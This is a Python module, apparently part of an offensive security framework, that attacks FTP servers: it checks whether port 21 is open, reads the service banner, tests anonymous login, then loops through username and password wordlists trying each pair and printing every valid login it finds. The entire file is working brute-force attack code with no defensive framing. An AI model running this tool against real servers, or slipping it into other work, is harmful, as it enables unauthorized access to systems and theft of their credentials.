from ftplib import FTP
from core.base_module import BaseModule
import socket
import time


class FTPBruteforce(BaseModule):

    def __init__(self, target, timeout=10):

        super().__init__("FTP Bruteforce")

        self.target = target
        self.timeout = timeout

        self.users_file = "modules/bruteforce/wordlists/users.txt"
        self.passwords_file = "modules/bruteforce/wordlists/passwords.txt"

    def load_wordlist(self, path):

        try:
            with open(path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]

        except:
            return []

    def check_ftp(self):

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)

            result = sock.connect_ex((self.target, 21))

            sock.close()

            return result == 0

        except:
            return False

    def run(self, data):

        results = []

        ftp_data = {
            "target": self.target,
            "ftp_open": False
        }

        users = self.load_wordlist(self.users_file)
        passwords = self.load_wordlist(self.passwords_file)

        try:

            # 🔎 comprobar FTP abierto
            if not self.check_ftp():

                results.append(ftp_data)

                data["ftp_bruteforce"] = results
                return data

            ftp_data["ftp_open"] = True

            # 🔥 obtener banner
            ftp = FTP()

            ftp.connect(
                self.target,
                21,
                timeout=self.timeout
            )

            ftp_data["banner"] = ftp.getwelcome()

            ftp.quit()

            # 🔥 comprobar anonymous login
            try:

                ftp = FTP()

                ftp.connect(
                    self.target,
                    21,
                    timeout=self.timeout
                )

                ftp.login()

                ftp_data["anonymous_login"] = True

                ftp.quit()

            except:

                ftp_data["anonymous_login"] = False

            # 🔥 bruteforce
            valid_credentials = []

            for user in users:

                for password in passwords:

                    try:

                        ftp = FTP()

                        ftp.connect(
                            self.target,
                            21,
                            timeout=self.timeout
                        )

                        ftp.login(user, password)

                        valid_credentials.append({
                            "username": user,
                            "password": password
                        })

                        print(
                            f"[+] FTP VALID: "
                            f"{user}:{password} "
                            f"@ {self.target}"
                        )

                        ftp.quit()

                        break

                    except:
                        pass

                    time.sleep(0.3)

            ftp_data["valid_credentials"] = valid_credentials

        except Exception as e:

            ftp_data["error"] = str(e)

        results.append(ftp_data)

        data["ftp_bruteforce"] = results

        return data